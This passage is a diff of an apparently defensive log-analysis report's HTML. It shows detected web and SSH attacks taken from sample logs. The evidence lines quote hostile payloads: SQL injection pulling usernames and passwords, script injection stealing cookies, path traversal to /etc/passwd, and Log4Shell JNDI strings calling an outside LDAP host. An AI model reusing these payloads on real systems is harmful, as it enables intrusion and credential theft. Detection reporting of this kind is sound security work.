 access.log:611: 192.0.2.150 - - [10/Oct/2026:14:05:12 +0200] &quot;GET /.git/config HTTP/1.1&quot; 200 17569 &quot;-&quot; &quot;gobuster/3.6&quot;
 access.log:639: 192.0.2.150 - - [10/Oct/2026:14:05:19 +0200] &quot;GET /.git/config HTTP/1.1&quot; 200 46930 &quot;-&quot; &quot;gobuster/3.6&quot;
 access.log:667: 192.0.2.150 - - [10/Oct/2026:14:05:26 +0200] &quot;GET /.git/config HTTP/1.1&quot; 200 18798 &quot;-&quot; &quot;gobuster/3.6&quot;
-access.log:579: 192.0.2.150 - - [10/Oct/2026:14:05:04 +0200] &quot;GET /cgi-bin/test.cgi HTTP/1.1&quot; 404 582 &quot;-&quot; &quot;gobuster/3.6&quot;</pre></details></article><article class="finding" style="--sev:var(--high)"><header><span class="badge">high</span><strong>Injection attempts</strong><span class="ip">203.0.113.200</span><span class="rule muted">WEB_INJECTION</span><span class="muted">6 events &middot; 2026-10-10 16:30:06 &rarr; 16:30:18</span></header><p>6 requests carrying attack payloads: Command injection, Cross-site scripting, Path traversal, SQL injection.</p><details><summary>Evidence</summary><pre>access.log:762: 203.0.113.200 - - [10/Oct/2026:16:30:06 +0200] &quot;GET /products?id=1%20AND%20SLEEP(5) HTTP/1.1&quot; 500 355 &quot;-&quot; &quot;sqlmap/1.8.9#stable (https://sqlmap.org)&quot;
+access.log:579: 192.0.2.150 - - [10/Oct/2026:14:05:04 +0200] &quot;GET /cgi-bin/test.cgi HTTP/1.1&quot; 404 582 &quot;-&quot; &quot;gobuster/3.6&quot;</pre></details></article><article class="finding" data-sev="high" style="--sev:var(--sev-high);--ink:var(--ink-high)"><header><span class="badge">high</span><strong>Injection attempts</strong><span class="ip">203.0.113.200</span><span class="rule muted">WEB_INJECTION</span><span class="muted">6 events &middot; 2026-10-10 16:30:06 &rarr; 16:30:18</span></header><p>6 requests carrying attack payloads: Command injection, Cross-site scripting, Path traversal, SQL injection.</p><details><summary>Evidence</summary><pre>access.log:762: 203.0.113.200 - - [10/Oct/2026:16:30:06 +0200] &quot;GET /products?id=1%20AND%20SLEEP(5) HTTP/1.1&quot; 500 355 &quot;-&quot; &quot;sqlmap/1.8.9#stable (https://sqlmap.org)&quot;
 access.log:763: 203.0.113.200 - - [10/Oct/2026:16:30:09 +0200] &quot;GET /products?id=1%20UNION%20ALL%20SELECT%20NULL,username,password%20FROM%20users-- HTTP/1.1&quot; 500 340 &quot;-&quot; &quot;sqlmap/1.8.9#stable (https://sqlmap.org)&quot;
 access.log:764: 203.0.113.200 - - [10/Oct/2026:16:30:10 +0200] &quot;GET /products?id=-1%27%20OR%20%271%27=%271 HTTP/1.1&quot; 403 510 &quot;-&quot; &quot;sqlmap/1.8.9#stable (https://sqlmap.org)&quot;
 access.log:765: 203.0.113.200 - - [10/Oct/2026:16:30:13 +0200] &quot;GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1&quot; 200 18743 &quot;-&quot; &quot;sqlmap/1.8.9#stable (https://sqlmap.org)&quot;
-access.log:766: 203.0.113.200 - - [10/Oct/2026:16:30:14 +0200] &quot;GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1&quot; 500 248 &quot;-&quot; &quot;sqlmap/1.8.9#stable (https://sqlmap.org)&quot;</pre></details></article><article class="finding" style="--sev:var(--high)"><header><span class="badge">high</span><strong>Injection attempts</strong><span class="ip">192.0.2.201</span><span class="rule muted">WEB_INJECTION</span><span class="muted">2 events &middot; 2026-10-10 19:12:00 &rarr; 19:12:02</span></header><p>2 requests carrying attack payloads: Log4Shell (CVE-2021-44228).</p><details><summary>Evidence</summary><pre>access.log:859: 192.0.2.201 - - [10/Oct/2026:19:12:00 +0200] &quot;GET / HTTP/1.1&quot; 200 26643 &quot;-&quot; &quot;${jndi:ldap://203.0.113.66:1389/Exploit}&quot;
-access.log:860: 192.0.2.201 - - [10/Oct/2026:19:12:02 +0200] &quot;GET /api/login HTTP/1.1&quot; 404 533 &quot;-&quot; &quot;${jndi:ldap://203.0.113.66:1389/Exploit}&quot;</pre></details></article><article class="finding" style="--sev:var(--medium)"><header><span class="badge">medium</span><strong>Automated scanner</strong><span class="ip">192.0.2.150</span><span class="rule muted">WEB_SCANNER</span><span class="muted">108 events &middot; 2026-10-10 14:05:00 &rarr; 14:05:27</span></header><p>112 requests; 108 not-found responses within 2 min and scanner User-Agent (gobuster).</p><details><summary>Evidence</summary><pre>access.log:561: 192.0.2.150 - - [10/Oct/2026:14:05:00 +0200] &quot;GET /admin HTTP/1.1&quot; 404 409 &quot;-&quot; &quot;gobuster/3.6&quot;
+access.log:766: 203.0.113.200 - - [10/Oct/2026:16:30:14 +0200] &quot;GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1&quot; 500 248 &quot;-&quot; &quot;sqlmap/1.8.9#stable (https://sqlmap.org)&quot;</pre></details></article><article class="finding" data-sev="high" style="--sev:var(--sev-high);--ink:var(--ink-high)"><header><span class="badge">high</span><strong>Injection attempts</strong><span class="ip">192.0.2.201</span><span class="rule muted">WEB_INJECTION</span><span class="muted">2 events &middot; 2026-10-10 19:12:00 &rarr; 19:12:02</span></header><p>2 requests carrying attack payloads: Log4Shell (CVE-2021-44228).</p><details><summary>Evidence</summary><pre>access.log:859: 192.0.2.201 - - [10/Oct/2026:19:12:00 +0200] &quot;GET / HTTP/1.1&quot; 200 26643 &quot;-&quot; &quot;${jndi:ldap://203.0.113.66:1389/Exploit}&quot;
+access.log:860: 192.0.2.201 - - [10/Oct/2026:19:12:02 +0200] &quot;GET /api/login HTTP/1.1&quot; 404 533 &quot;-&quot; &quot;${jndi:ldap://203.0.113.66:1389/Exploit}&quot;</pre></details></article><article class="finding" data-sev="medium" style="--sev:var(--sev-medium);--ink:var(--ink-medium)"><header><span class="badge">medium</span><strong>Automated scanner</strong><span class="ip">192.0.2.150</span><span class="rule muted">WEB_SCANNER</span><span class="muted">108 events &middot; 2026-10-10 14:05:00 &rarr; 14:05:27</span></header><p>112 requests; 108 not-found responses within 2 min and scanner User-Agent (gobuster).</p><details><summary>Evidence</summary><pre>access.log:561: 192.0.2.150 - - [10/Oct/2026:14:05:00 +0200] &quot;GET /admin HTTP/1.1&quot; 404 409 &quot;-&quot; &quot;gobuster/3.6&quot;
 access.log:562: 192.0.2.150 - - [10/Oct/2026:14:05:00 +0200] &quot;GET /backup HTTP/1.1&quot; 404 288 &quot;-&quot; &quot;gobuster/3.6&quot;
 access.log:563: 192.0.2.150 - - [10/Oct/2026:14:05:00 +0200] &quot;GET /old HTTP/1.1&quot; 404 469 &quot;-&quot; &quot;gobuster/3.6&quot;
 access.log:564: 192.0.2.150 - - [10/Oct/2026:14:05:00 +0200] &quot;GET /test HTTP/1.1&quot; 404 176 &quot;-&quot; &quot;gobuster/3.6&quot;
-access.log:565: 192.0.2.150 - - [10/Oct/2026:14:05:01 +0200] &quot;GET /dev HTTP/1.1&quot; 404 249 &quot;-&quot; &quot;gobuster/3.6&quot;</pre></details></article><article class="finding" style="--sev:var(--medium)"><header><span class="badge">medium</span><strong>SSH brute-force</strong><span class="ip">203.0.113.99</span><span class="rule muted">SSH_BRUTE_FORCE</span><span class="muted">12 events &middot; 2026-10-10 22:41:14 &rarr; 22:43:15</span></header><p>12 failed logins, peak of 12 within 5 min. Most targeted: deploy.</p><details><summary>Evidence</summary><pre>auth.log:476: Oct 10 22:41:14 web01 sshd[56667]: Failed password for deploy from 203.0.113.99 port 47893 ssh2
+access.log:565: 192.0.2.150 - - [10/Oct/2026:14:05:01 +0200] &quot;GET /dev HTTP/1.1&quot; 404 249 &quot;-&quot; &quot;gobuster/3.6&quot;</pre></details></article><article class="finding" data-sev="medium" style="--sev:var(--sev-medium);--ink:var(--ink-medium)"><header><span class="badge">medium</span><strong>SSH brute-force</strong><span class="ip">203.0.113.99</span><span class="rule muted">SSH_BRUTE_FORCE</span><span class="muted">12 events &middot; 2026-10-10 22:41:14 &rarr; 22:43:15</span></header><p>12 failed logins, peak of 12 within 5 min. Most targeted: deploy.</p><details><summary>Evidence</summary><pre>auth.log:476: Oct 10 22:41:14 web01 sshd[56667]: Failed password for deploy from 203.0.113.99 port 47893 ssh2
 auth.log:477: Oct 10 22:41:24 web01 sshd[36274]: Failed password for deploy from 203.0.113.99 port 31458 ssh2
 auth.log:478: Oct 10 22:41:38 web01 sshd[55485]: Failed password for deploy from 203.0.113.99 port 56331 ssh2
 auth.log:479: Oct 10 22:41:51 web01 sshd[51093]: Failed password for deploy from 203.0.113.99 port 38101 ssh2
-auth.log:480: Oct 10 22:42:03 web01 sshd[26983]: Failed password for deploy from 203.0.113.99 port 56487 ssh2</pre></details></article><article class="finding" style="--sev:var(--medium)"><header><span class="badge">medium</span><strong>Automated scanner</strong><span class="ip">203.0.113.200</span><span class="rule muted">WEB_SCANNER</span><span class="muted">8 events &middot; 2026-10-10 16:30:03 &rarr; 16:30:18</span></header><p>8 requests; scanner User-Agent (sqlmap).</p><details><summary>Evidence</summary><pre>access.log:760: 203.0.113.200 - - [10/Oct/2026:16:30:03 +0200] &quot;GET /products?id=1 HTTP/1.1&quot; 500 300 &quot;-&quot; &quot;sqlmap/1.8.9#stable (https://sqlmap.org)&quot;
+auth.log:480: Oct 10 22:42:03 web01 sshd[26983]: Failed password for deploy from 203.0.113.99 port 56487 ssh2</pre></details></article><article class="finding" data-sev="medium" style="--sev:var(--sev-medium);--ink:var(--ink-medium)"><header><span class="badge">medium</span><strong>Automated scanner</strong><span class="ip">203.0.113.200</span><span class="rule muted">WEB_SCANNER</span><span class="muted">8 events &middot; 2026-10-10 16:30:03 &rarr; 16:30:18</span></header><p>8 requests; scanner User-Agent (sqlmap).</p><details><summary>Evidence</summary><pre>access.log:760: 203.0.113.200 - - [10/Oct/2026:16:30:03 +0200] &quot;GET /products?id=1 HTTP/1.1&quot; 500 300 &quot;-&quot; &quot;sqlmap/1.8.9#stable (https://sqlmap.org)&quot;
 access.log:761: 203.0.113.200 - - [10/Oct/2026:16:30:05 +0200] &quot;GET /products?id=1%27 HTTP/1.1&quot; 500 536 &quot;-&quot; &quot;sqlmap/1.8.9#stable (https://sqlmap.org)&quot;
 access.log:762: 203.0.113.200 - - [10/Oct/2026:16:30:06 +0200] &quot;GET /products?id=1%20AND%20SLEEP(5) HTTP/1.1&quot; 500 355 &quot;-&quot; &quot;sqlmap/1.8.9#stable (https://sqlmap.org)&quot;
 access.log:763: 203.0.113.200 - - [10/Oct/2026:16:30:09 +0200] &quot;GET /products?id=1%20UNION%20ALL%20SELECT%20NULL,username,password%20FROM%20users-- HTTP/1.1&quot; 500 340 &quot;-&quot; &quot;sqlmap/1.8.9#stable (https://sqlmap.org)&quot;
-access.log:764: 203.0.113.200 - - [10/Oct/2026:16:30:10 +0200] &quot;GET /products?id=-1%27%20OR%20%271%27=%271 HTTP/1.1&quot; 403 510 &quot;-&quot; &quot;sqlmap/1.8.9#stable (https://sqlmap.org)&quot;</pre></details></article><article class="finding" style="--sev:var(--medium)"><header><span class="badge">medium</span><strong>SSH username enumeration</strong><span class="ip">192.0.2.77</span><span class="rule muted">SSH_USER_ENUM</span><span class="muted">7 events &middot; 2026-10-10 11:01:30 &rarr; 11:10:30</span></header><p>7 non-existent usernames tried: ftpuser, git, oracle, pi, postgres, test, ubuntu.</p><details><summary>Evidence</summary><pre>auth.log:376: Oct 10 11:01:30 web01 sshd[16843]: Failed password for invalid user oracle from 192.0.2.77 port 54259 ssh2
+access.log:764: 203.0.113.200 - - [10/Oct/2026:16:30:10 +0200] &quot;GET /products?id=-1%27%20OR%20%271%27=%271 HTTP/1.1&quot; 403 510 &quot;-&quot; &quot;sqlmap/1.8.9#stable (https://sqlmap.org)&quot;</pre></details></article><article class="finding" data-sev="medium" style="--sev:var(--sev-medium);--ink:var(--ink-medium)"><header><span class="badge">medium</span><strong>SSH username enumeration</strong><span class="ip">192.0.2.77</span><span class="rule muted">SSH_USER_ENUM</span><span class="muted">7 events &middot; 2026-10-10 11:01:30 &rarr; 11:10:30</span></header><p>7 non-existent usernames tried: ftpuser, git, oracle, pi, postgres, test, ubuntu.</p><details><summary>Evidence</summary><pre>auth.log:376: Oct 10 11:01:30 web01 sshd[16843]: Failed password for invalid user oracle from 192.0.2.77 port 54259 ssh2
 auth.log:378: Oct 10 11:03:00 web01 sshd[47384]: Failed password for invalid user test from 192.0.2.77 port 53448 ssh2
 auth.log:380: Oct 10 11:04:30 web01 sshd[61943]: Failed password for invalid user postgres from 192.0.2.77 port 44121 ssh2
 auth.log:382: Oct 10 11:06:00 web01 sshd[41359]: Failed password for invalid user ubuntu from 192.0.2.77 port 55024 ssh2
-auth.log:385: Oct 10 11:07:30 web01 sshd[52774]: Failed password for invalid user git from 192.0.2.77 port 31598 ssh2</pre></details></article><article class="finding" style="--sev:var(--low)"><header><span class="badge">low</span><strong>Probing for sensitive files</strong><span class="ip">198.51.100.66</span><span class="rule muted">WEB_SENSITIVE_PROBE</span><span class="muted">3 events &middot; 2026-10-10 06:48:03 &rarr; 06:48:09</span></header><p>3 requests for well-known sensitive paths, all refused: /wp-admin/, /wp-login.php, /xmlrpc.php.</p><details><summary>Evidence</summary><pre>access.log:263: 198.51.100.66 - - [10/Oct/2026:06:48:03 +0200] &quot;GET /wp-login.php HTTP/1.1&quot; 404 540 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0 Safari/537.36&quot;
+auth.log:385: Oct 10 11:07:30 web01 sshd[52774]: Failed password for invalid user git from 192.0.2.77 port 31598 ssh2</pre></details></article><article class="finding" data-sev="low" style="--sev:var(--sev-low);--ink:var(--ink-low)"><header><span class="badge">low</span><strong>Probing for sensitive files</strong><span class="ip">198.51.100.66</span><span class="rule muted">WEB_SENSITIVE_PROBE</span><span class="muted">3 events &middot; 2026-10-10 06:48:03 &rarr; 06:48:09</span></header><p>3 requests for well-known sensitive paths, all refused: /wp-admin/, /wp-login.php, /xmlrpc.php.</p><details><summary>Evidence</summary><pre>access.log:263: 198.51.100.66 - - [10/Oct/2026:06:48:03 +0200] &quot;GET /wp-login.php HTTP/1.1&quot; 404 540 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0 Safari/537.36&quot;
 access.log:264: 198.51.100.66 - - [10/Oct/2026:06:48:06 +0200] &quot;GET /wp-admin/ HTTP/1.1&quot; 404 293 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0 Safari/537.36&quot;
 access.log:265: 198.51.100.66 - - [10/Oct/2026:06:48:09 +0200] &quot;GET /xmlrpc.php HTTP/1.1&quot; 404 324 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0 Safari/537.36&quot;</pre></details></article>
 <h2>Files analysed</h2>
-<table><thead><tr><th>File</th><th>Format</th><th>Lines</th><th>Events</th></tr></thead><tbody><tr><td><code>samples\auth.log</code></td><td>auth</td><td>506</td><td>362</td></tr><tr><td><code>samples\access.log</code></td><td>nginx</td><td>1,025</td><td>1,025</td></tr></tbody></table>
-</main></body></html>
+<div class="chart"><table><thead><tr><th>File</th><th>Format</th><th>Lines</th><th>Events</th></tr></thead>
+<tbody><tr><td><code>samples\auth.log</code></td><td>auth</td><td>506</td><td>362</td></tr><tr><td><code>samples\access.log</code></td><td>nginx</td><td>1,025</td><td>1,025</td></tr></tbody></table></div>
+</main><div id="tip" hidden></div><script>
+const tip=document.getElementById('tip');
+document.addEventListener('pointerover',e=>{const t=e.target.closest('[data-tip]');
+  if(!t){tip.hidden=true;return}tip.textContent=t.dataset.tip;tip.hidden=false});
+document.addEventListener('pointermove',e=>{if(tip.hidden)return;
+  tip.style.left=Math.min(e.clientX+14,innerWidth-tip.offsetWidth-8)+'px';
+  tip.style.top=Math.min(e.clientY+14,innerHeight-tip.offsetHeight-8)+'px'});
+addEventListener('scroll',()=>{tip.hidden=true},{passive:true});
+document.querySelectorAll('.filters input').forEach(box=>box.addEventListener('change',()=>{
+  document.querySelectorAll('.finding[data-sev="'+box.value+'"]').forEach(f=>f.hidden=!box.checked)}));
+</script></body></html>
